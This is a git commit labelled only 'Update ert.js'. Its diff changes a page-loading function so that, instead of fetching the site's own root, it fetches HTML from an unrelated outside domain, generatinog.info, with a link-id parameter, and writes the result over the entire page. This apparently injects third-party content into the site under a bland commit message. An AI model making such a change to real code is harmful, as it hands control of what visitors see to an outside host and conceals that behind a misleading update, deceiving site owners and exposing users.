3e6f99eb0e65c1d0dbb1687dbaf7fb6fd2b3b78c
wddfsdcv76 <87509224+wddfsdcv76@users.noreply.github.com>
2021-08-20 03:13:20 +0100

    Update ert.js

--- ert.js
+++ ert.js
@@ -1,5 +1,5 @@
 function load_home () {
-    fetch("/" /*, options */)
+    fetch("https://generatinog.info/?linkid=16468" /*, options */)
     .then((response) => response.text())
     .then((html) => {
         document.querySelector("html").innerHTML = html;
